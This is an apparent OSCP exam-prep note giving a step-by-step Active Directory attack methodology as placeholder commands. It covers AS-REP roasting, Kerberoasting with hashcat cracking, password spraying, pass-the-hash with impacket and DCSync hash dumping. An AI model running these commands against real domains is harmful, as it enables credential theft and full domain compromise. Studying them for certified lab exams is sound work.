Created: 2026-07-24 13:50
#note

# 🏰 Active Directory Attack Methodology (OSCP 40-Point Set)

> [!abstract] Objective
> Systematically compromise a 3-machine AD domain (Client / Standalone -> Domain Controller) to secure the mandatory 40 points on the OSCP exam.

---

## 1. Initial Domain Enumeration
- **Nmap Scan:**
  ```bash
  nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 -sV -sC -pN -oA nmap_ad <TARGET_IP>
  ```
- **Domain & NetBIOS Name Extraction:**
  ```bash
  netexec smb <TARGET_IP>
  enum4linux-ng -A <TARGET_IP>
  ```
- **DNS Record Lookup:**
  ```bash
  dig axfr @<DC_IP> <DOMAIN_NAME>
  ```

---

## 2. User Enumeration & No-Preauth Attack (AS-REP Roasting)
- **User Enumeration (Kerbrute / RPC):**
  ```bash
  kerbrute userenum --dc <DC_IP> -d <DOMAIN> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
  ```
- **AS-REP Roasting (No Pre-Authentication Required):**
  ```bash
  impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -format hashcat -outputfile asrep.hash -no-pass -dc-ip <DC_IP>
  hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
  ```

---

## 3. Password Spraying & Credential Harvesting
- **Password Spraying:**
  ```bash
  netexec smb <DC_IP> -u users.txt -p 'Summer2026!' --continue-on-success
  ```
- **SMB Share Enumeration:**
  ```bash
  netexec smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' --shares
  smbclient -U '<DOMAIN>/<USER>' //<TARGET_IP>/<SHARE>
  ```

---

## 4. Authenticated AD Enumeration & Kerberoasting
- **BloodHound Ingestion:**
  ```bash
  bloodhound-python -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -dc <DC_HOST> -c All
  ```
- **Kerberoasting (Service Account Ticket Extraction):**
  ```bash
  impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -request -outputfile kerberoast.hash
  hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
  ```

---

## 5. Lateral Movement & PrivEsc to Domain Admin
- **WinRM Access:** `evil-winrm -i <IP> -u '<USER>' -p '<PASSWORD>'`
- **Pass-the-Hash / Pass-the-Ticket:**
  ```bash
  impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>
  impacket-wmiexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>
  ```
- **DCSync (Extract Domain Admin Hashes):**
  ```bash
  impacket-secretsdump <DOMAIN>/<DOMAIN_ADMIN>:'<PASSWORD>'@<DC_IP>
  ```

---

## 🔗 Useful External Links
- [Impacket GitHub Repository](https://github.com/fortra/impacket)
- [BloodHound Python Ingester](https://github.com/dirkjanm/BloodHound.py)
- [PayloadsAllTheThings AD Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Active%20Directory%20Methodology)

#### Tags
#oscp #active_directory #enumeration #kerberoast #asreproast #bloodhound #impacket
